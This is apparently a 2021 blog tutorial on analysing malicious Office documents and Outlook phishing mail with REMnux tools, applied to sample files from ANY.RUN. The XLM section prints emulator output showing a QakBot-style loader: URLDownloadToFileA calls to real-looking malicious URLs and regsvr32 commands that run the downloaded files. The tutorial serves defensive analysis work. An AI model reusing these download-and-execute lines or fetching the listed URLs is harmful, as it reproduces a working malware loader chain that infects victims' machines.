---
layout: post
title: "Maldoc analysis 101"
date: 2021-12-23 00:00 +0100
description: Working with msg files. Extracting attachements. Analyzing VBA and xlm4 macros.
tag: 
  - malware analysis
  - office documents
--- 

<figure>
<img src="https://raw.githubusercontent.com/mncmb/mncmb.github.io/master/_posts/Maldoc-analysis-101/sixteen-miles-out-sNu6PXm-EcM-unsplash.jpg">
<figcaption></figcaption>
</figure>

## intro

It's holiday season and besides all those wishes, greetings and merry feelings sits a giant pile of messages full of phishing and malicious documents, or in short maldocs. 
And while that dumpster fire that is log4j is still going strong, not every threat must be that intimidating. Because some of them can be tackled through tried and tested methods.

So put away your matchsticks and your plans of burning everything to the ground, because I will give you a rundown of the most valuable tools for analyzing mails and office documents with the goal of evaluating their malicious payloads. 

While this is nothing new, I hope this collection of tools and workflows might come in handy for future me or future you.


## overview

 1. samples and tools
 1. payload extraction
 1. VBA macros
 1. Excel 4.0 macros / XLM


## 1. samples and tools 
### samples
Every sample and payload discussed here was taken from [ANY RUN](https://any.run/). 

ANY RUN is a great ressource for the aspiring malware analyst. Not only can you search for different samples by tag and download them, but you already got a wealth of information through the dynamic analysis results from the sandbox. This is all besides the primary value of the sandbox as a means of evaluating suspicious payloads.

If you are looking for a specific piece of malware, or even CVEs and exploits, you can do so by [tag](https://any.run/cybersecurity-blog/indicators-tags/). There is a plethora of tags available, especially for certain families. To name just a few to get you started:
- `azorult`
- `njrat`
- `cobaltstrike`
- `qakbot`

You can search for these through the public submissions or even search for a specific sample by its file hash. Though finding the correct spelling (and tag name) can be tricky.

<figure>
<img src="https://raw.githubusercontent.com/mncmb/mncmb.github.io/master/_posts/Maldoc-analysis-101/anyrun-search.png">
<figcaption>searching ANY RUN for QAKBot in the public submissions</figcaption>
</figure>

As for the samples I am going to use, you can find a list of them here:

|Type   | File name| ANYRUN Task | 
|-------|-------|-------|
| email | Approved LPO Copy- D31 Project.msg | https://app.any.run/tasks/1b4ab689-4073-4884-bf58-6a89dc0d1b79/ |
| OLE2/VBA | 02f3b89c7ad90fed3e057b6243a7293f.xls | https://app.any.run/tasks/c85cb8c4-1413-41cb-9863-311fc9ec481c/ |
| XLM | RQ-1206231314.xlsb | https://app.any.run/tasks/f82116f5-0006-4880-9f57-d7e063d1d541/ | 


### tools
So much for the samples, now let's get to the tools. 

For these I recommend not bothering with most of the search and installation procedures and just setting up everything you need to get started through [REMNUX](https://remnux.org/). REMNUX is a purpose built distribution similar to Kali Linux but with a focus on aiming in malware analysis. It contains tools for static analysis and reverse engineering of files, but also different dynamic analysis tools like emulators for VBA, JS, shellcode and others. 

You can set it up either by picking a VM image or installing it on an existing (Ubuntu) system. I'd always go with the former, to keep purity of purpose. 

What is also great about REMNUX is the [documentation](https://docs.remnux.org/). Here you can search for tools that come with REMNUX or are part of the repositories based on a topic or theme.

<figure>
<img src="https://raw.githubusercontent.com/mncmb/mncmb.github.io/master/_posts/Maldoc-analysis-101/remnux-search.png">
<figcaption>searching REMNUX docs for info on email tools</figcaption>
</figure>
If you'd search for `email` in the docs (see image above) and click on `Email Messages` you would land on a page about email related tools and information, like how to call them from command line, or the github project page and author. This comes in handy if you are looking for specific tools that could help with an unfamiliar subject.


## 2. payload extraction
In maldoc analysis you sometimes face the issue of having to deal with restrictive microsoft file formats. One of them is the outlook mail message format, denoted by its file extension `.msg`. Common linux email clients like Thunderbird oder Evolution cannot parse these by default and require extensions to display the messages. But a mail client is not required for analysis. There are two great tools to circumvent these problems:
- `msgconvert`
- `extract_msg`

### msgconvert

One common way of dealing with `.msg` files is converting them to the much easier to parse `.eml` format through `msgconvert`. Eml is a plain text format and the default for email clients like Thunderbird. After converting the file it can be opened in the email client of your choice. The format is pretty universal. Attachements are available in the form of base64 blocks of data, which can be decoded and piped into a file.

### extract_msg
Another, easier way of dealing with `.msg` files is by extracting their contents in an automated fashion. REMNUX comes with the `extract_msg` command, which does what it says, extracting msg files. 

### passwords and other data

Either option can be used to get to the payload. But keep in mind that in some cases the message context might be important. Sometimes mail attachements are encrypted or the attached maldoc is password protected and a look into the mail body is important. Passwords can come either in plain text or as a picture. But even in plain text they might be not that simple to read. HTML formatting tricks are used by some mail creators so that the _password_ phrase and the used password appear next to each other in the html mail, but are separated in the plain text mail. 

So keep an eye out for formatting or other tricks, when looking through the original mail for a password.

### sample message

As for the sample for this chapter it is as follows:

|  | value | 
|-------|-------|
| Name | Approved LPO Copy- D31 Project.msg |
| Type | Email |
| Link | https://app.any.run/tasks/1b4ab689-4073-4884-bf58-6a89dc0d1b79/ |

When using `extract_msg` on a msg file a directory is created that contains all extracted items. In this example, there is a cab archive among the extracted files. The archive can be decompressed with `7z` and returns an executable with the name `Approved LPO Copy- D31 Project.exe`. 

Since we were looking for the payload and got a PE file (a windows executable), there is not much more to do in this case. We could continue with dynamic or static analysis of the file and see if it behaves as a dropper or loader. Or maybe it is already the final payload and acts as an info stealer/remote access trojan (RAT). 

<figure>
<img src="https://raw.githubusercontent.com/mncmb/mncmb.github.io/master/_posts/Maldoc-analysis-101/extract-files-from-msg2.png">
<figcaption>extracting contents from msg file</figcaption>
</figure>

ANY RUN has good integration with VirusTotal. You can look up the executable on VT from the ANY RUN task dashboard. 
1. Click on the process in the process pane on the right hand side and select `More info` 
2. Click on `Lookup on VT` (see image)

<figure>
<img src="https://raw.githubusercontent.com/mncmb/mncmb.github.io/master/_posts/Maldoc-analysis-101/lookup-vt.png">
<figcaption>Look up suspicious process on VT from ANY RUN </figcaption>
</figure>

Some detections on VT point towards __REMCOS__. As a next step it would be a good idea to learn about the capabilities of this family. You can use either the search engine of your choice or a knowledge base like [malpedia](https://malpedia.caad.fkie.fraunhofer.de/).

### side note - capa
In this case the sample is a PE file, a windows executable. And while we are working on a linux system, REMNUX comes with different frameworks and tools for binary emulation. Among them are `capa` and `binee`. Capa was successful in executing the binary and providing meaningful output that can be used to either get an overview of the capabilities of the malware or enhance the starting point for a deeper analysis. 

The following is an excerpt from the output that capa provided. The complete output is significantly larger than this. You can follow along by calling capa without any arguments apart from the executable name
`capa "Approved LPO Copy- D31 Project.exe"`

```
+------------------------+------------------------------------------------------------------------------------+
| md5                    | 9b43ba805a58d80a1694706ba0f61e5a                                                   |
| sha1                   | 2cb8fdc9e0a296af03717625bbd81c4c75083545                                           |
| sha256                 | 2c55882502f8febc439bad64bdb134661a2c7ad3bac355e35b32ba059fe6e9f1                   |
| path                   | sample.exe                                                                         |
+------------------------+------------------------------------------------------------------------------------+

+------------------------+------------------------------------------------------------------------------------+
| ATT&CK Tactic          | ATT&CK Technique                                                                   |
|------------------------+------------------------------------------------------------------------------------|
| COLLECTION             | Clipboard Data [T1115]                                                             |
|                        | Input Capture::Keylogging [T1056.001]                                              |
|                        | Screen Capture [T1113]                                                             |
| DEFENSE EVASION        | Hide Artifacts::Hidden Window [T1564.003]                                          |
|                        | Obfuscated Files or Information [T1027]                                            |
|                        | Virtualization/Sandbox Evasion::System Checks [T1497.001]                          |
| DISCOVERY              | Application Window Discovery [T1010]                                               |
|                        | File and Directory Discovery [T1083]                                               |
|                        | Query Registry [T1012]                                                             |
|                        | System Information Discovery [T1082]                                               |
| EXECUTION              | Command and Scripting Interpreter [T1059]                                          |
|                        | Shared Modules [T1129]                                                             |
+------------------------+------------------------------------------------------------------------------------+
...
```
The output of capa also gives further indicators that this is in fact some kind of info stealer/ RAT. Capabilities like clipboard and screenshot capturing, keylogging and hiding the window point towards an executable that wants to stay unnoticed and has the capability of stealing sensitive user data. 


## 3. VBA macros
VBA macros included in office documents were pretty common during the last years and were probably the largest part of malspam that arrived in peoples inboxes. Executables and script files that can be executed in windows (e.g. `.js` files, `.hta` to some extend) are more likely to be filtered by a mail security gateway than office documents. There are many great tools for analyzing these, but the cornerstones are:
- `olevba`
- `oledump.py`
- `vmonkey`

The first two tools are a part of the `oletools` project. Most if not all office documents are in the OLE2 file format, which is essentially an archive format. You can work with these through either `oletools` or an archiving utility like `7z` to unpack them and manually dig through the files. If you go the manual route then you should keep `strings` ready, but it is a great fallback if other tools encounter problems.

As for the sample for this chapter:

|  | value | 
|-------|-------|
| Name | 02f3b89c7ad90fed3e057b6243a7293f.xls |
| Type | OLE2 file / VBA macros |
| Link | https://app.any.run/tasks/c85cb8c4-1413-41cb-9863-311fc9ec481c/ |

### olevba

When analyzing maldocs, a good starting point is the output of `olevba`. It highlights suspicious entries and also prints out all available macros. If nothing was found it is a good idea to dig through the individual files or streams with the help of `oledump`. 

<figure>
<img src="https://raw.githubusercontent.com/mncmb/mncmb.github.io/master/_posts/Maldoc-analysis-101/olevba.png">
<figcaption>olevba output for 02f3b89c7ad90fed3e057b6243a7293f.xls</figcaption>
</figure>

Apart from showing all macros contained in the document olevba also gives a summary of noteworthy and suspicious VBA methods/functions. 

In this case it points out an __AutoExec__ entry that is triggered on `workbook_open`. There are different kinds of trigger mechanisms but `workbook_open` is probably the most common. Though keep in mind that there are others and you could encounter a `workbook_close` and wonder why your maldoc won't execute in a sandbox. In this case the execution would obviously start after you've closed the document...

### oledump

`oledump` on the other hand is a simpler tool, that does not interpret results for you. Instead it simply shows the contents of files (called streams) embedded within the OLE2 file, the office document.

Calling it without arguments gives an overview of all embedded streams (files).

<figure>
<img src="https://raw.githubusercontent.com/mncmb/mncmb.github.io/master/_posts/Maldoc-analysis-101/oledump.png">
<figcaption>oledump output for 02f3b89c7ad90fed3e057b6243a7293f.xls</figcaption>
</figure>

Columns containing an `m` or `M` denote streams with macros. Indivudal streams can then be inspected with the stream flag `-s <ID>`. So stream number 3 with the name _VBA/Sheet1_ could be inspected with the command 
```
oledump.py -s A3 02f3b89c7ad90fed3e057b6243a7293f.xls
```
which would return a hexdump view of the stream. In order to display the stream in a more readable fashion you can append other flags. The most important ones are:
- `-v` decompress VBA
- `-S` strings
- `-d` dump raw bytes

<figure>
<img src="https://raw.githubusercontent.com/mncmb/mncmb.github.io/master/_posts/Maldoc-analysis-101/oledump-decompress.png">
<figcaption>oledump output for 02f3b89c7ad90fed3e057b6243a7293f.xls</figcaption>
</figure>

For inspecting macro streams, the `-v` option is the most relevant. If you want to output to a file, then `-d` becomes the choice. Leaving out the flag (hexdump mode) or working with strings `-S` is relevant for non macro streams. Sometimes you find other parts of the maldoc in those streams, for example encoded powershell commands or other bits of information.

In the above image `-v` was used to decompress the VBA macro. If you would instead dump the contents with `-d` you'd encounter non readeable/ non ASCII characters in the output.

### vmonkey
`vmonkey` is the command line tool behind the [vipermonkey](https://github.com/decalage2/ViperMonkey) project. Vipermonkey is a VBA emulator that helps greatly in analyzing suspicious documents.

Additionally, it is easy to use:
```
vmonkey 02f3b89c7ad90fed3e057b6243a7293f.xls
```
starts the analysis process and presents you with output in the following way.

<figure>
<img src="https://raw.githubusercontent.com/mncmb/mncmb.github.io/master/_posts/Maldoc-analysis-101/vmonkey.png">
<figcaption>vmonkey  output for 02f3b89c7ad90fed3e057b6243a7293f.xls</figcaption>
</figure>

As you can see `vmonkey` emulates the macro execution and presents you with a rundown of all observed actions. The most important one in this case is the execution of a remote file through the use of an obfuscated `MSIEXEC` command. If you are unfamiliar with that binary you can probably still guess, or find out after a quick search, that it is a legitimate windows binary. This means we are moving on _living of the land_-territory, the concept of an attacker using legitimate system binaries to achieve their goals. 

To find out more about this binary, the same ressources can be leveraged that an offensive security person would use. The [lolbas-project](https://lolbas-project.github.io/) contains a list of misusable system binaries that is easily searchable. [Here](https://lolbas-project.github.io/lolbas/Binaries/Msiexec/) we can find out more about `MSIEXEC` and how it can be leveraged to execute code.

### side note - password protection
From time to time you will encounter a password protected office document. While some of the tools, like `olevba` have a command line switch that lets you run them with a supplied password, others have not. But there is a tool that can help with these cases. [msoffice-crypt](https://docs.remnux.org/discover-the-tools/analyze+documents/microsoft+office#msoffice-crypt) and [msoffcrypto-tool](https://docs.remnux.org/discover-the-tools/analyze+documents/microsoft+office#msoffcrypto-tool) can be used to strip away the password protection. Afterwards all of the common tools can be used on the unencrypted document.

## 4. XLM / Excel 4.0 macros
During the last months Excel 4.0 macros seem to have gained even more traction than they had [previously](https://blog.reversinglabs.com/blog/excel-4.0-macros). They saw a constant increase in use since February 2020. A good writeup on a recent, influential campaign utilizing these was this article by [Talos Intelligence on SquirrelWaffle](https://blog.talosintelligence.com/2021/10/squirrelwaffle-emerges.html).
Also current ANY RUN submissions are full with office documents containing Excel 4.0 macros. Even though Microsoft just [deactivated them in their Office 365 product line](https://blog.malwarebytes.com/reports/2021/10/at-long-last-microsoft-is-disabling-excel-4-0-macros-by-default/), they are still a threat to local installations of MSoffice and will probably stay for a while. But overall they are a _"thing from the 90s"_ (1992!) and got replaced by VBA. Unfortunately neither `oletools` or `vmonkey` work with these macros, so we have to look for another tool.

I haven't really found a good tool for static analysis that can replace `oletools` (though [zipdump and xmldump seem to be similar](https://isc.sans.edu/forums/diary/Excel+4+Macro+Analysis+XLMMacroDeobfuscator/26110/)), but there is a great replacement in the area of dynamic analysis or emulation. [XLMMacroDeobfuscator](https://github.com/DissectMalware/XLMMacroDeobfuscator) can replace `vmonkey` for dynamic analysis of documents containing XLM macros.

|  | value | 
|-------|-------|
| Name | RQ-1206231314.xlsb |
| Type | Excel 4.0 macro / XLM |
| Link | https://app.any.run/tasks/f82116f5-0006-4880-9f57-d7e063d1d541/ |

### installation

Since REMNUX 7.0 doesn't come preinstalled with it you might have to install it manually.
```bash
pip install XLMMacroDeobfuscator --force
```
The emulator ran into an error with some recent maldocs, but this was fixed by upgrading the version:
```bash
pip install XLMMacroDeobfuscator --upgrade
```

### emulating XLM macros
After everything is set up you can evaluate a sample by calling the emulator with the _file_ flag `-f`.
```
xlmdeobfuscator -f RQ-1206231314.xlsb
```

<figure>
<img src="https://raw.githubusercontent.com/mncmb/mncmb.github.io/master/_posts/Maldoc-analysis-101/xlmdeobfuscator.png">
<figcaption>XLMMacroDeobfuscator output for RQ-1206231314.xlsb</figcaption>
</figure>

The output of `XLMDeobfuscator` is great for IOC extraction. It shows calls to different Windows API methods and their parameters.

```
CELL:E14       , FullEvaluation      , CALL("urlmon","URLDownloadToFileA","JJCCBB",0,"https://leadindia.org/ZcB75lrD/gt.png","C:\Dabmo\dal1.ocx",0,0)
CELL:E16       , FullEvaluation      , CALL("urlmon","URLDownloadToFileA","JJCCBB",0,"https://chromedomemotorcycleproducts.com/3EA8kMgxh/gt.png","C:\Dabmo\dal2.ocx",0,0)
CELL:E18       , FullEvaluation      , CALL("urlmon","URLDownloadToFileA","JJCCBB",0,"https://chromedomemp.com/V29gSMjM/gt.png","C:\Dabmo\dal3.ocx",0,0)
CELL:E20       , FullEvaluation      , CALL("Shell32","ShellExecuteA","JJCCCJJ",0,"open","regsvr32","C:\Dabmo\dal1.ocx",0,5)
CELL:E22       , FullEvaluation      , CALL("Shell32","ShellExecuteA","JJCCCJJ",0,"open","regsvr32","C:\Dabmo\dal2.ocx",0,5)
CELL:E24       , FullEvaluation      , CALL("Shell32","ShellExecuteA","JJCCCJJ",0,"open","regsvr32","C:\Dabmo\dal3.ocx",0,5)
```
From the textual output you can see the `CALL` method followed by the `dll` and `function` that was called. Afterwards comes what I think is a descriptor of the argument types (return type, [type of other args, ...]) and the parameters of the function.

From this example we can gather that the maldoc is a loader that tries to download 3 other files. Puts them in the location `"C:\Dabmo\dal[X].ocx"` and starts them with regsvr32. This is typical for [current QAKBot campaigns](https://www.microsoft.com/security/blog/2021/12/09/a-closer-look-at-qakbots-latest-building-blocks-and-how-to-knock-them-down/).


Thanks for reading. I hope you learned something.
